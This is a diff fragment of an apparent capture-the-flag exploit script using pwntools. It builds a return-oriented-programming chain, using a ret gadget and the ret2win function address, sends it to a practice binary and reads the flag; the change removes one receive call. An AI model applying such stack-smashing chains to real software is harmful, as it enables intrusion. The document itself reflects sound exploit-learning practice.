@@ -14,8 +14,6 @@ rop += p64(0x000000000040053e) # ret gadget --> solving MOVAPS issue in Ubuntu >
 rop += p64(ELF.symbols["ret2win"])
 
 log.success(f"ROP chain : {rop}")
-
-p.recv()
 p.sendline(rop)
 
 flag = p.recvall().split(b'\n')[-2]
